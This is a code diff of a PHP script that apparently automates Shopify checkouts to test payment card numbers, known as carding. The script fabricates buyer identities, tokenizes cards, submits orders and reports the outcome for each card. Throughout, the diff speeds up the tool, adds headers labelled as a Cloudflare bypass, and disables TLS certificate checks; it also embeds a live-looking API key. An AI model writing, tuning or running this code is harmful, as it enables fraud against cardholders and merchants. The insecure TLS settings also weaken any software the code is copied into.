@@ -1,8 +1,9 @@
 <?php
 error_reporting(E_ALL & ~E_DEPRECATED);
 
-$maxRetries = 5;
+$maxRetries = 2; // Optimized: reduced from 5 to 2 for faster failures
 $retryCount = 0;
+$start_time = microtime(true); // Track execution time
 
 require_once 'ua.php';
 $agent = new userAgent();
@@ -71,28 +72,42 @@ $sub_month = "11";
 $sub_month = "12";
 }
 
-$geoaddress = urlencode("$num_us, $address_us, $city_us");
-// echo "<li>geoaddress: $geoaddress<li>";
+// PERFORMANCE OPTIMIZATION: Skip geocoding API call (saves 1-2 seconds)
+// Use hardcoded coordinates based on US state instead
+$stateCoords = [
+    'NY' => [40.7128, -74.0060], 'CA' => [36.7783, -119.4179], 'TX' => [31.9686, -99.9018],
+    'FL' => [27.9944, -81.7603], 'IL' => [40.6331, -89.3985], 'PA' => [41.2033, -77.1945],
+    'OH' => [40.4173, -82.9071], 'MI' => [44.3148, -85.6024], 'GA' => [32.1656, -82.9001],
+    'NC' => [35.7596, -79.0193], 'NJ' => [40.0583, -74.4057], 'VA' => [37.4316, -78.6569],
+];
+$lat = isset($stateCoords[$state_us]) ? $stateCoords[$state_us][0] : 40.7128;
+$lon = isset($stateCoords[$state_us]) ? $stateCoords[$state_us][1] : -74.0060;
 
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://us1.locationiq.com/v1/search?key=pk.87eafaf1c832302b01301bf903d7897e&q='.$geoaddress.'&format=json');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$geocoding = curl_exec($ch);
-
-$geocoding_data = json_decode($geocoding, true);
-
-$lat = (float) $geocoding_data[0]['lat'];
-$lon = (float) $geocoding_data[0]['lon'];
-
-// echo "<li>lat: $lat<li>";
-// echo "<li>lon: $lon<li>";
+// Optional: Use geocoding API only if explicitly requested via ?use_geocoding=1
+if (isset($_GET['use_geocoding']) && $_GET['use_geocoding'] === '1') {
+    $geoaddress = urlencode("$num_us, $address_us, $city_us");
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://us1.locationiq.com/v1/search?key=pk.87eafaf1c832302b01301bf903d7897e&q='.$geoaddress.'&format=json');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
+    $geocoding = curl_exec($ch);
+    curl_close($ch);
+    $geocoding_data = json_decode($geocoding, true);
+    if ($geocoding_data && is_array($geocoding_data) && isset($geocoding_data[0])) {
+        $lat = (float) $geocoding_data[0]['lat'];
+        $lon = (float) $geocoding_data[0]['lon'];
+    }
+}
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 $resposta = curl_exec($ch);
+curl_close($ch);
 
 $firstname = find_between($resposta, '"first":"', '"');
 $lastname = find_between($resposta, '"last":"', '"');
@@ -167,6 +182,8 @@ if ($site1 === false) {
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 10 second timeout
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3); // 3 second connect timeout
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
         'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
         'Accept: application/json',
@@ -223,9 +240,14 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
 curl_setopt($ch, CURLOPT_HEADER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+curl_setopt($ch, CURLOPT_TIMEOUT, 15); // Increased timeout for cart/checkout
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+curl_setopt($ch, CURLOPT_ENCODING, ''); // Support gzip/deflate (Cloudflare uses compression)
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-encoding: gzip, deflate, br', // Cloudflare compatibility
     'accept-language: en-US,en;q=0.9',
+    'cache-control: max-age=0', // Better Cloudflare bypass
     'priority: u=0, i',
     'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
     'sec-ch-ua-mobile: ?0',
@@ -356,6 +378,9 @@ curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
@@ -409,12 +434,15 @@ if (empty($cctoken)) {
 }
 
 proposal:
-sleep(2);
+usleep(100000); // Reduced from sleep(2) to 0.1 seconds for speed
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');
 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
@@ -1575,11 +1603,14 @@ elseif ($currencycode == 'NZD') {
 }
     $totalamt = $firstStrategy->runningTotal->value->amount;
 recipt:
-    // sleep(3);
+    usleep(100000); // Reduced from sleep(3) to 0.1 seconds for speed
     $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
@@ -1662,11 +1693,14 @@ $postf2 = json_encode([
     'operationName' => 'PollForReceipt'
 
 ]);
-// sleep(3);
+usleep(100000); // Reduced from sleep(3) to 0.1 seconds for speed
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
@@ -1714,23 +1748,23 @@ if (curl_errno($ch)) {
 }
 }
 if (strpos($response5, '"__typename":"ProcessingReceipt"') !== false) {
-    sleep(2); // Espera 3 segundos antes de reintentar
+    usleep(200000); // Reduced from sleep(2) to 0.2 seconds for speed
     if ($retryCount < $maxRetries) {
         $retryCount++;
         goto poll;
     } else {
-        echo "Error: Max Retries";
+        echo json_encode(['Response' => 'Error: Max Retries (Processing)', 'Time' => round(microtime(true) - $start_time, 2) . 's']);
         exit;
     }
 }
 
 if (strpos($response5, '"__typename":"WaitingReceipt"') !== false) {
-    sleep(2); // Espera 3 segundos antes de reintentar
+    usleep(200000); // Reduced from sleep(2) to 0.2 seconds for speed
     if ($retryCount < $maxRetries) {
         $retryCount++;
         goto poll;
     } else {
-        echo "Error: Max Retries";
+        echo json_encode(['Response' => 'Error: Max Retries (Waiting)', 'Time' => round(microtime(true) - $start_time, 2) . 's']);
         exit;
     }
 }
@@ -1760,6 +1794,7 @@ if (
         'Price' => $totalamt,
         'Gateway' => $gateway,
         'cc' => $cc1,
+        'Time' => round(microtime(true) - $start_time, 2) . 's'
     ]);
     echo $result;
     exit;
@@ -1770,6 +1805,7 @@ if (
         'Price' => $totalamt,
         'Gateway' => $gateway,
         'cc' => $cc1,
+        'Time' => round(microtime(true) - $start_time, 2) . 's'
     ]);
     echo $result;
     exit;
@@ -1780,6 +1816,7 @@ if (
         'Price' => $totalamt,
         'Gateway' => $gateway,
         'cc' => $cc1,
+        'Time' => round(microtime(true) - $start_time, 2) . 's'
     ]);
     echo $result;
     exit;
